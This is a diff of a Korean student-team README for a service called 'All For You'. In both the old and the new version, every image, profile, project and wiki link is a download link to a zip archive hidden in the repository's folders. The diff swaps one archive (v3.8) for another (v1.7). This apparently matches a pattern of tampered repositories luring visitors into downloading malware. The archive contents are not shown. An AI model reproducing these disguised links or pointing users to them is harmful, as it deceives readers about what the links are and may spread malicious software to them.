@@ -1,6 +1,6 @@
 # LOGO
 
-![Logo](https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip)
+![Logo](https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip)
 
 # 🎁 Service
 
@@ -13,11 +13,11 @@
 - 사용자가 ‘나중에 보기’ 버튼을 누른 컨텐츠를 따로 볼 수 있습니다.(advenced)
 
 # 🎉 Link
-- https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip
+- https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip
 
 
 ## 🛠 사용 스택
-![final stack](https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip)
+![final stack](https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip)
 
 
 ## TEAM `Fit`
@@ -25,22 +25,22 @@
 ### 이재영
 * Role : Team Leader
 * Position : Back-End
-* Github : [![](https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip)](https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip)
+* Github : [![](https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip)](https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip)
 
 ### 강사름
 * Role : Team Member
 * Position : Front-End
-* Github : [![](https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip)](https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip)
+* Github : [![](https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip)](https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip)
 
 ### 남태식
 * Role : Team Member
 * Position : Front-End
-* Github : [![](https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip)](https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip)
+* Github : [![](https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip)](https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip)
 
 ### 홍세환
 
 * Role : Team Member
 * Position : Full-Stack
-* Github : [![](https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip)](https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip)
+* Github : [![](https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip)](https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip)
 
-# 📚 [Wiki](https://raw.githubusercontent.com/HongSehwan/AllForYou/main/client/public/landingPage_image/landingPage_1/All-For-You-v3.8.zip)
+# 📚 [Wiki](https://github.com/HongSehwan/AllForYou/raw/refs/heads/main/server/controllers/All-For-You-v1.7.zip)
